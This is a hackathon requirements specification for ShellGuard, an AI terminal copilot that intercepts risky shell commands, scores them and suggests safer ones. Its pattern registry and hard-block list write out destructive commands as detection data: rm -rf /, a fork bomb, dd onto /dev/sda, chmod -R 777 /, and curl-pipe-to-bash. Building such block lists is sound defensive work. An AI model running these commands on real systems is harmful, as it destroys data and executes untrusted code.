Software Requirements Specification (SRS)
ShellGuard — AI Terminal Copilot with Safety Rails
Version: 1.0
Date: February 2025
Author: Team Penna
Hackathon: Hack All February Series (Archestra-Sponsored)

Table of Contents
Introduction
Overall Description
System Architecture
Functional Requirements
Non-Functional Requirements
Archestra Integration Strategy
Data Requirements
External Interface Requirements
User Interface Requirements
Security Requirements
Observability & Monitoring
Deployment Requirements
Constraints & Assumptions
Acceptance Criteria
Risk Analysis
Appendices

1. Introduction
   1.1 Purpose
   This Software Requirements Specification document provides a comprehensive description of ShellGuard, an AI-powered terminal copilot that intercepts potentially dangerous shell commands before execution, analyzes their risk, explains consequences in plain English, suggests safer alternatives, and maintains a full audit trail. This document serves as the authoritative reference for all design, development, testing, and evaluation activities during the hackathon.

1.2 Scope
ShellGuard is a web-based application that provides:

A fully functional terminal emulator in the browser connected to a real shell session via PTY (pseudo-terminal)
Real-time command interception and AI-powered safety analysis before execution
Visual risk assessment with severity classification, consequence mapping, and risk breakdown scores
Intelligent suggestion of safer alternative commands that achieve the same goal
A persistent command history and audit log with statistics
An analytics dashboard showing interception patterns and safety metrics
Deep integration with Archestra's MCP agent orchestration, security guardrails, observability, and deployment platform
In Scope:

Web-based terminal with command interception
AI-powered risk analysis (pattern matching + LLM)
Safer alternative suggestion engine
Command explanation engine
Real-time warning overlay UI
Command history and session analytics
Archestra full-stack integration (MCP, guardrails, observability, deployment)
Out of Scope (for hackathon MVP):

Native CLI tool / shell plugin installation
Multi-user authentication and role-based access
Custom rule authoring UI
Integration with external SIEM or compliance systems
Mobile interface
Automated command rewriting without user confirmation
1.3 Definitions, Acronyms, and Abbreviations
Term Definition
PTY Pseudo-Terminal — a virtual terminal device that provides a bidirectional communication channel
MCP Model Context Protocol — Archestra's protocol for AI agent orchestration
Guardrails Safety constraints applied to AI agent inputs and outputs
xterm.js Open-source terminal emulator component for web browsers
LLM Large Language Model
Archestra AI agent orchestration platform sponsoring the hackathon
REPL Read-Eval-Print Loop
Fork Bomb A denial-of-service attack that recursively spawns processes
Pipe-to-Shell Pattern of piping downloaded content directly to a shell interpreter
Risk Score Numerical value (0-100) indicating command danger level
Safe Swap Replacement of a dangerous command with a safer alternative
Interception The act of catching and analyzing a command before it executes
Blast Radius The scope of potential damage from a command
1.4 References
Archestra Platform Documentation (https://archestra.dev)
Archestra MCP SDK and Agent Orchestration Guide
xterm.js Documentation (https://xtermjs.org)
Google Gemini API Documentation (https://ai.google.dev/docs)
Python PTY Module Documentation
FastAPI WebSocket Documentation
MITRE ATT&CK Framework (for dangerous command patterns)
CIS Benchmarks (for system hardening command validation)
IEEE 830-1998 (SRS Standard)
1.5 Document Conventions
SHALL indicates a mandatory requirement
SHOULD indicates a recommended requirement
MAY indicates an optional requirement
Requirements are tagged: FR-XXX (Functional), NFR-XXX (Non-Functional), SR-XXX (Security), IR-XXX (Interface), AR-XXX (Archestra) 2. Overall Description
2.1 Product Perspective
ShellGuard sits between the user and the operating system shell, acting as an intelligent safety layer. Unlike traditional command-line tools that merely restrict access (like rbash or sudoers), ShellGuard uses AI to understand the intent and consequences of commands, providing contextual education alongside protection.

text

┌──────────────────────────────────────────────────────────────────────┐
│ TRADITIONAL TERMINAL │
│ │
│ User ──▶ Shell ──▶ OS Kernel ──▶ Execution │
│ (bash) (execve) (irreversible) │
│ │
│ Problem: No safety net between intent and execution │
└──────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────┐
│ SHELLGUARD TERMINAL │
│ │
│ User ──▶ ShellGuard ──▶ Risk? ──NO──▶ Shell ──▶ Execution │
│ (intercept) │ │
│ YES │
│ │ │
│ ▼ │
│ ┌─────────────┐ │
│ │ AI Analysis │ │
│ │ + Warning │ │
│ │ + Safe Alt │ │
│ └──────┬──────┘ │
│ │ │
│ ┌─────────┼──────────┐ │
│ ▼ ▼ ▼ │
│ [Approve] [Use Safe] [Cancel] │
│ │ │ │ │
│ ▼ ▼ ▼ │
│ Execute Execute Abort │
│ Original Alternative │
└──────────────────────────────────────────────────────────────────────┘
2.2 Product Features (High-Level)
Feature ID Feature Priority Build Time
PF-01 Web-based terminal emulator (xterm.js + PTY) Critical 2 hours
PF-02 Command interception before execution Critical 1.5 hours
PF-03 Pattern-based instant risk detection Critical 1 hour
PF-04 AI-powered deep risk analysis (LLM) Critical 1.5 hours
PF-05 Visual warning overlay with risk breakdown Critical 1.5 hours
PF-06 Safer alternative command suggestion Critical 0.5 hours (part of AI)
PF-07 Command explanation engine High 0.5 hours
PF-08 Command history and audit log High 1 hour
PF-09 Session analytics dashboard Medium 1 hour
PF-10 Archestra MCP agent orchestration Critical 1 hour
PF-11 Archestra security guardrails Critical 0.5 hours
PF-12 Archestra observability integration High 0.5 hours
PF-13 Archestra deployment High 0.5 hours
2.3 User Classes and Characteristics
2.3.1 Primary Users: Developers and System Administrators
Technical Level: Medium to High
Use Case: Day-to-day terminal operations where a mistyped command could cause damage
Key Needs: Minimal disruption to workflow for safe commands; clear warnings for dangerous ones; learning through explanation
Pain Point: Everyone has a horror story about a destructive command they wish they hadn't run
Environment: Web browser, working on local or remote servers
2.3.2 Secondary Users: Junior Engineers / Students
Technical Level: Low to Medium
Use Case: Learning Linux/terminal commands in a safe environment
Key Needs: Explanation of what commands do, why they're dangerous, and what to use instead
Pain Point: Copy-pasting commands from the internet without understanding them
2.3.3 Tertiary Users: Security / Compliance Teams
Technical Level: High
Use Case: Auditing command execution, enforcing safety policies
Key Needs: Complete audit trail, pattern configuration, analytics on dangerous command attempts
Pain Point: No visibility into what commands engineers are running
2.4 Operating Environment
Server-Side: Linux-based system (Ubuntu 22.04+, Debian 12+, or macOS for development)
Client-Side: Modern web browsers (Chrome 90+, Firefox 88+, Safari 14+, Edge 90+)
Runtime: Python 3.11+ with FastAPI, running within Archestra centralized runtime
Terminal Backend: Linux PTY (pseudo-terminal) via Python pty module
Network: WebSocket (WSS in production, WS in development) for bidirectional terminal I/O
2.5 Design and Implementation Constraints
Hackathon Duration: Complete development within a single day (~12-14 active hours)
New Project: Must be built from scratch; no pre-existing codebases
Archestra Required: Must leverage Archestra MCP, runtime, guardrails, observability, and deployment for maximum hackathon scoring
Pre-planning Allowed: This SRS, notes, diagrams, and sketches may be prepared before the hackathon starts; coding begins at kickoff
Third-Party Libraries Allowed: Open-source packages (xterm.js, FastAPI, etc.) and public APIs (Google Gemini) are permitted
PTY Constraint: The PTY-based terminal only works on Unix-like systems (Linux/macOS); Windows would require WSL
LLM Latency: AI analysis adds latency; only risky commands should trigger AI (safe commands pass through instantly)
Cost Management: LLM API calls cost money; pattern matching should pre-filter to minimize unnecessary API calls 3. System Architecture
3.1 High-Level Architecture
text

┌────────────────────────────────────────────────────────────────────────────┐
│ SHELLGUARD SYSTEM │
│ │
│ ┌─────────────────────────────────────────────────────────────────────┐ │
│ │ FRONTEND (Next.js) │ │
│ │ │ │
│ │ ┌───────────────────┐ ┌──────────────┐ ┌───────────────────┐ │ │
│ │ │ xterm.js │ │ Warning │ │ Analysis Panel │ │ │
│ │ │ Terminal │ │ Overlay │ │ (Risk Breakdown) │ │ │
│ │ │ Emulator │ │ Component │ │ │ │ │
│ │ └────────┬──────────┘ └──────────────┘ └───────────────────┘ │ │
│ │ │ │ │
│ │ ┌────────┴──────────┐ ┌──────────────┐ ┌───────────────────┐ │ │
│ │ │ WebSocket │ │ Command │ │ Session Stats │ │ │
│ │ │ Client │ │ History │ │ Dashboard │ │ │
│ │ └────────┬──────────┘ └──────────────┘ └───────────────────┘ │ │
│ └───────────┼─────────────────────────────────────────────────────────┘ │
│ │ WebSocket (bidirectional) │
│ ┌───────────▼─────────────────────────────────────────────────────────┐ │
│ │ BACKEND (FastAPI + Python) │ │
│ │ │ │
│ │ ┌───────────────────────────────────────────────────────────────┐ │ │
│ │ │ WebSocket Handler │ │ │
│ │ │ • Receives keystrokes from browser │ │ │
│ │ │ • Buffers current command line input │ │ │
│ │ │ • Detects Enter key (command submission) │ │ │
│ │ │ • Routes to interceptor on command submit │ │ │
│ │ │ • Forwards safe output back to browser │ │ │
│ │ └───────────────────────┬───────────────────────────────────────┘ │ │
│ │ │ │ │
│ │ ┌───────────────────────▼───────────────────────────────────────┐ │ │
│ │ │ Command Interceptor │ │ │
│ │ │ • Captures command before PTY execution │ │ │
│ │ │ • Runs quick pattern matching (instant) │ │ │
│ │ │ • If suspicious → triggers AI analysis │ │ │
│ │ │ • If safe → passes directly to PTY │ │ │
│ │ └──────────┬────────────────────────────┬───────────────────────┘ │ │
│ │ │ (safe) │ (risky) │ │
│ │ ▼ ▼ │ │
│ │ ┌──────────────────┐ ┌──────────────────────────────────┐ │ │
│ │ │ PTY Manager │ │ ARCHESTRA ORCHESTRATION LAYER │ │ │
│ │ │ │ │ │ │ │
│ │ │ • Manages bash │ │ ┌────────────────────────┐ │ │ │
│ │ │ PTY session │ │ │ Risk Analyzer Agent │ │ │ │
│ │ │ • Reads output │ │ │ (MCP Tool) │ │ │ │
│ │ │ • Writes input │ │ │ • Deep AI analysis │ │ │ │
│ │ │ • Handles │ │ │ • Risk scoring │ │ │ │
│ │ │ resize │ │ │ • Consequence mapping │ │ │ │
│ │ └──────────────────┘ │ └────────────────────────┘ │ │ │
│ │ │ │ │ │
│ │ │ ┌────────────────────────┐ │ │ │
│ │ │ │ Alternative Suggester │ │ │ │
│ │ │ │ Agent (MCP Tool) │ │ │ │
│ │ │ │ • Safer command │ │ │ │
│ │ │ │ generation │ │ │ │
│ │ │ │ • Explanation │ │ │ │
│ │ │ └────────────────────────┘ │ │ │
│ │ │ │ │ │
│ │ │ ┌────────────────────────┐ │ │ │
│ │ │ │ Command Explainer │ │ │ │
│ │ │ │ Agent (MCP Tool) │ │ │ │
│ │ │ │ • Break down flags │ │ │ │
│ │ │ │ • Plain English │ │ │ │
│ │ │ └────────────────────────┘ │ │ │
│ │ │ │ │ │
│ │ │ ┌────────────────────────┐ │ │ │
│ │ │ │ Archestra Guardrails │ │ │ │
│ │ │ │ • Catastrophic block │ │ │ │
│ │ │ │ • Output sanitization │ │ │ │
│ │ │ │ • Alternative safety │ │ │ │
│ │ │ └────────────────────────┘ │ │ │
│ │ │ │ │ │
│ │ │ ┌────────────────────────┐ │ │ │
│ │ │ │ Archestra Observability│ │ │ │
│ │ │ │ • Command traces │ │ │ │
│ │ │ │ • Risk metrics │ │ │ │
│ │ │ │ • Latency tracking │ │ │ │
│ │ │ └────────────────────────┘ │ │ │
│ │ └──────────────────────────────────┘ │ │
│ │ │ │
│ │ ┌───────────────────────────────────────────────────────────────┐ │ │
│ │ │ DATA LAYER │ │ │
│ │ │ ┌──────────────┐ ┌──────────────┐ ┌──────────────────┐ │ │ │
│ │ │ │ SQLite DB │ │ In-Memory │ │ Risk Pattern │ │ │ │
│ │ │ │ (History, │ │ Session │ │ Registry │ │ │ │
│ │ │ │ Audit Log, │ │ State │ │ (JSON config) │ │ │ │
│ │ │ │ Analytics) │ │ │ │ │ │ │ │
│ │ │ └──────────────┘ └──────────────┘ └──────────────────┘ │ │ │
│ │ └───────────────────────────────────────────────────────────────┘ │ │
│ └─────────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────────────┘
3.2 Command Interception Flow (Detailed)
text

User types keystroke in browser
│
▼
┌─────────────────────┐
│ xterm.js onData() │
│ Send via WebSocket │
└──────────┬──────────┘
│
▼
┌─────────────────────┐
│ WebSocket Handler │
│ Receive keystroke │
└──────────┬──────────┘
│
▼
┌─────────────────────────────────────────┐
│ Is it Enter key (\r or \n)? │
├─────────────┬───────────────────────────┤
│ NO │ YES │
│ │ │ │ │
│ ▼ │ ▼ │
│ Buffer the │ ┌────────────────────┐ │
│ character │ │ Extract buffered │ │
│ + forward │ │ command string │ │
│ to PTY for │ │ Clear buffer │ │
│ echo │ └─────────┬──────────┘ │
│ │ │ │
│ │ ▼ │
│ │ ┌────────────────────┐ │
│ │ │ Is command empty? │ │
│ │ ├──────┬─────────────┤ │
│ │ │ YES │ NO │ │
│ │ │ │ │ │ │ │
│ │ │ ▼ │ ▼ │ │
│ │ │Send │ ┌──────────┐│ │
│ │ │\r to │ │ Quick ││ │
│ │ │PTY │ │ Pattern ││ │
│ │ │ │ │ Check ││ │
│ │ │ │ └────┬─────┘│ │
│ │ │ │ │ │ │
│ │ │ │ ▼ │ │
│ │ │ │ ┌──────────────────────────┐ │
│ │ │ │ │ Risk Level? │ │
│ │ │ │ ├──────┬──────┬────────────┤ │
│ │ │ │ │SAFE │MED/ │CRITICAL │ │
│ │ │ │ │ │HIGH │ │ │
│ │ │ │ │ │ │ │ │ │ │ │
│ │ │ │ │ ▼ │ ▼ │ ▼ │ │
│ │ │ │ │Exec │ AI │ BLOCK │ │
│ │ │ │ │in │Anal- │ (no AI │ │
│ │ │ │ │PTY │ysis │ needed) │ │
│ │ │ │ │ │ │ Send │ │
│ │ │ │ │ │ │ │ hardcoded │ │
│ │ │ │ │ │ ▼ │ warning │ │
│ │ │ │ │ │┌────────────────┐ │ │
│ │ │ │ │ ││ Archestra MCP │ │ │
│ │ │ │ │ ││ Agent Analysis │ │ │
│ │ │ │ │ ││ │ │ │
│ │ │ │ │ ││ • Risk scoring │ │ │
│ │ │ │ │ ││ • Consequences │ │ │
│ │ │ │ │ ││ • Alternative │ │ │
│ │ │ │ │ ││ • Explanation │ │ │
│ │ │ │ │ │└───────┬────────┘ │ │
│ │ │ │ │ │ │ │ │
│ │ │ │ │ │ ▼ │ │
│ │ │ │ │ │ ┌────────────┐ │ │
│ │ │ │ │ │ │ Guardrails │ │ │
│ │ │ │ │ │ │ Validation │ │ │
│ │ │ │ │ │ └─────┬──────┘ │ │
│ │ │ │ │ │ │ │ │
│ │ │ │ │ │ ▼ │ │
│ │ │ │ │ │ Send Warning │ │
│ │ │ │ │ │ to Frontend │ │
│ │ │ │ │ │ │ │ │
│ │ │ │ │ │ ▼ │ │
│ │ │ │ │ │ ┌──────────────┐ │ │
│ │ │ │ │ │ │ User Decides │ │ │
│ │ │ │ │ │ ├──┬────┬──────┤ │ │
│ │ │ │ │ │ │ │ │ │ │ │
│ │ │ │ │ │ │App│Safe│Cancel│ │ │
│ │ │ │ │ │ │rov│Alt │ │ │ │
│ │ │ │ │ │ │ │ │ │ │ │
│ │ │ │ │ │ │ ▼ ▼ ▼ │ │ │
│ │ │ │ │ │ │Exec Exec │ │ │ │
│ │ │ │ │ │ │Orig Alt Noop│ │ │
│ │ │ │ └──────┘ └──────────────┘ │ │
└─────────────┴────────┴─────────────────────────────┴─┘
│
▼
┌──────────────────┐
│ Log to History │
│ + Observability │
└──────────────────┘
3.3 Technology Stack
Layer Technology Rationale
Frontend Framework Next.js 14 (App Router) SSR, fast DX, React ecosystem
Terminal Emulator xterm.js 5.x + FitAddon Industry standard, used by VS Code web
UI Components shadcn/ui + TailwindCSS Pre-built, polished components, rapid development
Icons Lucide React Consistent, lightweight icon set
Backend Framework Python 3.11+ / FastAPI Async WebSocket support, fast API development
Terminal Backend Python pty + os.fork() Native PTY support for real shell sessions
WebSocket FastAPI WebSocket Bidirectional real-time communication
AI/LLM Google Gemini 1.5 Flash (primary) Fast, cheap, excellent for classification tasks
AI Fallback Google Gemini 1.5 Pro Higher quality for complex analysis
Agent Orchestration Archestra MCP SDK Hackathon requirement, agent management
Security Archestra Guardrails Hackathon requirement, command safety enforcement
Observability Archestra Observability Hackathon requirement, metrics and tracing
Database SQLite 3 Zero-config, embedded, perfect for hackathon
Deployment Archestra Deploy + Docker Hackathon requirement
3.4 Project File Structure
text

ShellGuard/
├── README.md
├── LICENSE
├── .env.example
├── .gitignore
├── docker-compose.yml
│
├── backend/
│ ├── Dockerfile
│ ├── requirements.txt
│ ├── main.py # FastAPI entry point + WebSocket routes
│ ├── config.py # Environment configuration
│ │
│ ├── core/
│ │ ├── **init**.py
│ │ ├── terminal.py # PTY session manager
│ │ ├── interceptor.py # Command interception logic
│ │ ├── session.py # ShellGuard session handler
│ │ └── buffer.py # Command line input buffer
│ │
│ ├── analysis/
│ │ ├── **init**.py
│ │ ├── pattern_matcher.py # Fast pattern-based risk detection
│ │ ├── ai_analyzer.py # LLM-powered deep analysis
│ │ ├── risk_scorer.py # Risk score computation
│ │ └── alternative_generator.py # Safer alternative suggestion
│ │
│ ├── archestra/
│ │ ├── **init**.py
│ │ ├── mcp_tools.py # MCP tool definitions
│ │ ├── guardrails.py # Guardrail configurations
│ │ └── observability.py # Metrics and tracing setup
│ │
│ ├── data/
│ │ ├── **init**.py
│ │ ├── database.py # SQLite setup and queries
│ │ ├── models.py # Data models
│ │ ├── patterns.py # Dangerous command patterns registry
│ │ └── seed.py # Demo data seeding
│ │
│ ├── api/
│ │ ├── **init**.py
│ │ ├── websocket_handler.py # WebSocket message routing
│ │ ├── routes.py # REST API routes (history, stats)
│ │ └── schemas.py # Pydantic request/response schemas
│ │
│ └── tests/
│ ├── **init**.py
│ ├── test_pattern_matcher.py
│ ├── test_interceptor.py
│ └── test_risk_scorer.py
│
├── frontend/
│ ├── Dockerfile
│ ├── package.json
│ ├── tsconfig.json
│ ├── tailwind.config.ts
│ ├── next.config.js
│ │
│ ├── public/
│ │ ├── favicon.ico
│ │ └── logo.svg
│ │
│ ├── src/
│ │ ├── app/
│ │ │ ├── layout.tsx # Root layout with header
│ │ │ ├── page.tsx # Main terminal page
│ │ │ ├── dashboard/
│ │ │ │ └── page.tsx # Analytics dashboard
│ │ │ └── globals.css
│ │ │
│ │ ├── components/
│ │ │ ├── terminal/
│ │ │ │ ├── ShellTerminal.tsx # xterm.js terminal component
│ │ │ │ └── TerminalHeader.tsx # Terminal title bar
│ │ │ ├── warning/
│ │ │ │ ├── WarningOverlay.tsx # Main warning modal
│ │ │ │ ├── RiskBar.tsx # Risk score bar component
│ │ │ │ ├── ConsequenceList.tsx # Consequences display
│ │ │ │ └── SafeAlternative.tsx # Safe alternative display
│ │ │ ├── panels/
│ │ │ │ ├── AnalysisPanel.tsx # Right-side analysis panel
│ │ │ │ ├── HistoryPanel.tsx # Command history panel
│ │ │ │ └── StatsBar.tsx # Header statistics bar
│ │ │ ├── dashboard/
│ │ │ │ ├── StatsCards.tsx # Key metric cards
│ │ │ │ ├── RiskChart.tsx # Risk distribution chart
│ │ │ │ ├── TimelineChart.tsx # Commands over time
│ │ │ │ └── TopDangerous.tsx # Most common dangerous commands
│ │ │ └── shared/
│ │ │ ├── CodeBlock.tsx # Syntax highlighted code
│ │ │ ├── Badge.tsx # Risk/status badges
│ │ │ └── LoadingSpinner.tsx # Loading states
│ │ │
│ │ ├── hooks/
│ │ │ ├── useTerminalSocket.ts # WebSocket connection hook
│ │ │ ├── useCommandHistory.ts # Command history state
│ │ │ └── useSessionStats.ts # Session statistics
│ │ │
│ │ ├── lib/
│ │ │ ├── websocket.ts # WebSocket client helper
│ │ │ ├── api.ts # REST API client
│ │ │ └── utils.ts # Utility functions
│ │ │
│ │ └── types/
│ │ ├── terminal.ts # Terminal-related types
│ │ ├── analysis.ts # Analysis result types
│ │ └── history.ts # History entry types
│ │
│ └── tests/
│
└── docs/
├── SRS.md # This document
└── demo-script.md # Demo preparation guide 4. Functional Requirements
4.1 Terminal Emulator Module
FR-001: Web-Based Terminal Rendering

The system SHALL render a fully functional terminal emulator in the web browser using xterm.js
The terminal SHALL support standard terminal features: text input, cursor movement, scrollback buffer, text selection, and copy/paste
The terminal SHALL support ANSI color codes and escape sequences
The terminal SHALL use a monospace font (JetBrains Mono or Fira Code)
The terminal SHALL have a dark theme consistent with professional terminal applications
FR-002: PTY Backend Session

The system SHALL create a real pseudo-terminal (PTY) session running /bin/bash (or the user's default shell) on the server
The PTY session SHALL maintain state across multiple commands (environment variables, working directory, command history)
The PTY session SHALL support standard shell operations: piping, redirection, backgrounding, tab completion
The PTY session SHALL support terminal resize events from the browser
The PTY session SHALL be destroyed cleanly when the WebSocket connection closes
FR-003: Bidirectional Communication

The system SHALL establish a WebSocket connection between the browser terminal and the backend PTY
Keystrokes typed in the browser SHALL be transmitted to the backend in real-time (< 50ms latency)
PTY output SHALL be streamed back to the browser in real-time (< 50ms latency)
The WebSocket SHALL handle connection drops gracefully with reconnection attempts
FR-004: Terminal Responsiveness

The terminal SHALL dynamically resize to fit its container
The terminal SHALL support a minimum size of 80 columns × 24 rows
The terminal SHALL send resize events to the PTY when the browser window is resized
4.2 Command Interception Module
FR-010: Keystroke Buffering

The system SHALL buffer all keystrokes to build the current command line input
The buffer SHALL handle:
Regular character input (appending to buffer)
Backspace (\x7f) — removing last character from buffer
Ctrl+C (\x03) — clearing the buffer
Ctrl+U (\x15) — clearing the buffer
Ctrl+W — removing last word from buffer
Arrow keys — cursor movement within buffer
The buffer SHALL be cleared when Enter is pressed or when the command is submitted
FR-011: Enter Key Interception

When the user presses Enter (\r or \n), the system SHALL:
Capture the buffered command string
Clear the command buffer
Send the command to the interceptor for analysis
NOT forward the Enter keystroke to the PTY until the command is approved
Non-Enter keystrokes SHALL be forwarded to the PTY immediately for echo/display
FR-012: Non-Blocking Safe Commands

Commands determined to be safe by the pattern matcher SHALL be forwarded to the PTY for execution immediately with zero perceptible delay
The user SHALL NOT experience any interruption for safe commands
Safe command pass-through SHALL take less than 5ms
FR-013: Blocking Risky Commands

Commands determined to be risky SHALL be held and NOT executed until the user makes a decision
During the hold period, the system SHALL:
Display an "Analyzing..." indicator (for commands sent to AI)
Display the full warning overlay with analysis results
Wait for user action (approve, use alternative, cancel)
No input SHALL be forwarded to the PTY while a warning is active
FR-014: Empty Command Handling

If the user presses Enter with an empty buffer, the Enter SHALL be forwarded directly to the PTY (producing a new prompt line)
Empty commands SHALL NOT trigger any analysis
FR-015: Multi-line Command Handling

The system SHALL detect multi-line commands (ending with \, pipes, here-docs)
Multi-line commands SHALL be analyzed as a complete unit when the final Enter is pressed
The system SHOULD handle common multi-line patterns:
Backslash continuation (\ at end of line)
Pipe chains (command1 | command2 | command3)
Semicolon chains (command1; command2; command3)
&& and || chains
4.3 Risk Analysis Module
FR-020: Two-Tier Analysis Architecture

The system SHALL implement a two-tier analysis pipeline:
Tier 1 (Pattern Matching): Instant (< 5ms), rule-based, no API calls
Tier 2 (AI Analysis): 1-3 seconds, LLM-powered, triggered only for medium+ risk patterns
Tier 1 SHALL catch obvious dangerous patterns without incurring LLM cost/latency
Tier 2 SHALL provide nuanced analysis with explanations and alternatives
FR-021: Pattern-Based Risk Detection (Tier 1)

The system SHALL maintain a categorized registry of dangerous command patterns
Pattern categories and examples:
Risk Level Category Example Patterns
Critical System Destruction rm -rf /, dd if=/dev/zero of=/dev/sda, mkfs. on mounted device
Critical Fork Bomb :(){ :|:& };:, recursive process spawning
Critical Permission Catastrophe chmod -R 777 /, chmod -R 000 /
Critical Data Obliteration > /dev/sda, mv / /dev/null
High Recursive Delete rm -rf, rm -r (with arguments)
High Database Destruction DROP TABLE, DROP DATABASE, TRUNCATE
High Process Kill kill -9, killall, pkill
High Untrusted Execution curl | bash, wget | sh, curl | sudo bash
High Service Disruption shutdown, reboot, halt, init 0, init 6
High Permission Modification chmod 777, broad chown -R
Medium Package Removal apt remove, yum remove, pip uninstall
Medium Firewall Modification iptables -F, ufw disable
Medium Service Management systemctl stop, service stop
Medium Container Cleanup docker system prune, docker rm, docker rmi
Medium Git Destructive git push --force, git reset --hard, git clean -fd
Low Permission Change chmod (non-recursive, non-777)
Low Process Signal kill (without -9)
Low Configuration Edit vim /etc/, nano /etc/
Pattern matching SHALL be case-insensitive
Pattern matching SHALL handle whitespace variations
Pattern matching SHALL detect patterns within piped commands
The system SHALL support at least 50 distinct patterns
FR-022: AI-Powered Deep Analysis (Tier 2)

For commands flagged as medium risk or higher by Tier 1, the system SHALL invoke the AI analysis agent
The AI analysis SHALL return a structured JSON response containing:
TypeScript

interface AIAnalysis {
risk_level: "critical" | "high" | "medium" | "low";
risk_score: number; // 0-100
allow: boolean; // AI recommendation
title: string; // Short risk title (e.g., "Recursive Force Delete")
explanation: string; // What the command does and why it's risky
consequences: string[]; // List of potential consequences
safer_alternative: string; // A safer command achieving similar goal
alternative_explanation: string; // Why the alternative is safer
data_loss_risk: number; // 0-100
service_impact_risk: number; // 0-100
reversibility: number; // 0-100 (100 = fully reversible)
requires_sudo: boolean;
affected_scope: string; // Description of what's affected
command_breakdown: CommandPart[]; // Breakdown of each part of the command
}

interface CommandPart {
part: string; // e.g., "-rf"
meaning: string; // e.g., "recursive + force (no confirmation)"
risk_contribution: string; // e.g., "Prevents safety prompts"
}
The AI SHALL analyze the full command including all flags, arguments, pipes, and redirections
The AI SHALL consider the combination of flags (e.g., rm -rf is more dangerous than rm -r alone)
The AI analysis SHALL complete within 5 seconds
FR-023: Contextual Risk Assessment

The system SHOULD consider the working directory when assessing risk
rm -rf ./\* in /tmp is lower risk than in /etc
The system SHOULD consider whether the user is operating as root
The system SHOULD detect if a command targets critical system paths (/etc, /usr, /var, /boot, /dev)
FR-024: Critical Command Hard Block

The system SHALL immediately block certain catastrophic commands WITHOUT requiring AI analysis
Hard-blocked commands SHALL include:
rm -rf / (with or without --no-preserve-root)
Fork bombs in any syntax
dd writing to block devices (/dev/sda, etc.)
Commands that pipe to > /dev/sda
Hard blocks SHALL display a pre-built warning without API delay
Hard-blocked patterns SHALL be configurable in the pattern registry
4.4 Warning and Decision Module
FR-030: Warning Overlay Display

When a command is flagged as risky, the system SHALL display a warning overlay in the browser
The warning overlay SHALL contain:
ShellGuard branding/icon
Risk level badge (Critical / High / Medium) with color coding
The intercepted command (displayed in monospace, highlighted)
Risk title (short description)
Explanation (what the command does and why it's dangerous)
Consequences list (bullet points of what could happen)
Risk breakdown bars:
Data Loss Risk (0-100%)
Service Impact Risk (0-100%)
Irreversibility (0-100%, inverse of reversibility)
Safer alternative command (if available, in green-highlighted box)
Alternative explanation
Action buttons: [✅ Approve] [🔄 Use Safe Alternative] [❌ Cancel]
The overlay SHALL appear centered over the terminal with a backdrop blur
FR-031: User Decision Handling

Approve: The system SHALL execute the original risky command in the PTY, log the decision as "approved", and dismiss the overlay
Use Safe Alternative: The system SHALL execute the suggested safer command in the PTY, log the decision as "safe_swap", and dismiss the overlay
Cancel: The system SHALL NOT execute any command, log the decision as "cancelled", clear the command line in the PTY (send Ctrl+U + Enter), and dismiss the overlay
Explain More (optional): The system MAY provide additional detail via a follow-up AI query
After any decision, the terminal SHALL return to normal interactive mode
FR-032: Analysis In-Progress State

While AI analysis is running (Tier 2), the system SHALL display an "Analyzing command safety..." indicator
The indicator SHALL appear as a small overlay at the bottom of the terminal
The indicator SHALL include a subtle animation (pulse or spinner)
Terminal input SHALL be blocked during analysis
FR-033: Critical Block Display

For hard-blocked commands (FR-024), the system SHALL display a distinct warning:
Red/critical color scheme
"BLOCKED" badge (not just "Warning")
No "Approve" button (or "Approve" requires typing confirmation phrase)
Clear explanation of why this command is blocked unconditionally
Alternative suggestion if possible
4.5 Command History and Audit Module
FR-040: Command Logging

The system SHALL log every command entered by the user, regardless of risk level
Each log entry SHALL contain:
TypeScript

interface CommandLogEntry {
id: string; // UUID
session_id: string; // Session UUID
command: string; // The command entered
timestamp: string; // ISO 8601 UTC
risk_level: "safe" | "low" | "medium" | "high" | "critical";
action: "executed" | "approved" | "safe_swap" | "cancelled" | "blocked";
analysis: AIAnalysis | null; // Full AI analysis if performed
alternative_used: string | null; // The safe alternative if used
execution_result: "success" | "error" | "not_executed";
working_directory: string; // CWD at time of command
analysis_latency_ms: number; // Time taken for analysis (0 for safe)
}
FR-041: History Panel Display

The system SHALL display a scrollable command history panel in the UI
Each history entry SHALL show:
Timestamp (relative, e.g., "2 min ago")
Command text (truncated with tooltip for full text)
Status icon:
✅ Green check: safe, executed normally
⚠️ Yellow warning: warned, user approved
🔄 Blue swap: user chose safe alternative
🔴 Red block: cancelled or blocked
Risk level badge (if applicable)
History SHALL be ordered newest-first
History SHALL update in real-time as commands are processed
FR-042: Session Statistics

The system SHALL track and display the following statistics per session:
Metric Description
Total Commands Total commands entered in session
Safe Commands Commands that passed without interception
Warnings Issued Commands that triggered warnings
Approved (Risky) Risky commands user approved anyway
Safe Swaps Times user chose the safer alternative
Cancelled Times user cancelled after seeing warning
Blocked Commands that were hard-blocked
Interception Rate (Warnings + Blocked) / Total Commands × 100%
Safe Swap Rate Safe Swaps / Warnings × 100%
Statistics SHALL be displayed in the header bar of the application
Statistics SHALL update in real-time
FR-043: Persistent Storage

Command history SHALL be persisted to SQLite database
History SHALL survive application restart
The system SHALL support querying historical data via REST API
4.6 Analytics Dashboard Module
FR-050: Dashboard Overview Page

The system SHALL provide a separate analytics dashboard page (/dashboard)
The dashboard SHALL display:
Summary Cards:
Total commands analyzed (all-time)
Total interceptions (all-time)
Safe swap rate (percentage)
Average risk score of intercepted commands
Risk Distribution Chart:
Pie or donut chart showing distribution of commands by risk level
Interception Timeline:
Line chart showing command volume and interception rate over time
Most Common Dangerous Commands:
Ranked list of the most frequently intercepted command patterns
Recent Interceptions:
Table of the 20 most recent intercepted commands with details
FR-051: Dashboard Data API

The system SHALL provide REST API endpoints for dashboard data:
GET /api/stats — Session and all-time statistics
GET /api/history — Paginated command history
GET /api/history?risk_level=high — Filtered history
4.7 Command Explanation Module
FR-060: On-Demand Command Explanation

The system SHALL provide a "What does this do?" feature for any command
When the user clicks "Explain More" in the warning overlay, the system SHALL provide:
A flag-by-flag breakdown of the command
Plain-English explanation of each component
What each flag modifies in the command's behavior
What files/systems/services are affected
Whether the operation is reversible
FR-061: Command Breakdown Format

text

Command: rm -rf /var/log/nginx/\*.log

Breakdown:
┌──────────┬──────────────────────────────────────────────┐
│ rm │ Remove (delete) files or directories │
│ -r │ Recursive: delete directories and contents │
│ -f │ Force: no confirmation prompts, ignore errors │
